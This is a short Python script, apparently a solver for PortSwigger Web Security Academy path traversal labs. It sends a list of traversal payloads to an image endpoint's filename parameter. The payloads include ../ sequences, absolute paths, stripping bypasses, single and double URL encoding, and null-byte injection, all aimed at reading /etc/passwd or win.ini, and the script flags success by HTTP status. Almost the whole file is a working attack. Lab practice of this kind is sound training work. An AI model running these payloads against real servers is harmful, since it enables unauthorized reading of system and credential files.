#https://portswigger.net/web-security/learning-paths/path-traversal/reading-arbitrary-files-via-path-traversal/file-path-traversal/lab-simple#
#https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-absolute-path-bypass#
#https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-sequences-stripped-non-recursively#
#https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-superfluous-url-decode#
#https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-validate-start-of-path#
#https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-validate-file-extension-null-byte-bypass#
#all path traversal learning path labs included.
import requests
url = "https://0a14006004dea66995fe8c000095007c.web-security-academy.net/" #your lab url
img_url = url + "image?filename="
fuzz_list = [
    "../../../etc/passwd",
    "..\..\..\windows\win.ini",
    "/etc/passwd",
    "....//....//....//etc/passwd", #exploits a non recursive stripping implementation
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", #double encoded, for superfluous decoding vuln
    "/var/www/images/../../../etc/passwd", #exploits full file path validation that doesn't have canonicalizing implemented
    "../../../etc/passwd%00jpg",
    "../../../etc/passwd%00.jpg" #nullbyte injection
]
for item in fuzz_list:
    path_traverse_payload = img_url + item
    response = requests.get(path_traverse_payload)
    #print(response.text)
    print(path_traverse_payload)
    if (response.status_code == 400): #replace with relevant status codes
        print("unsuccessful")
    elif (response.status_code == 200):
        print("successful")
        #print(response.text)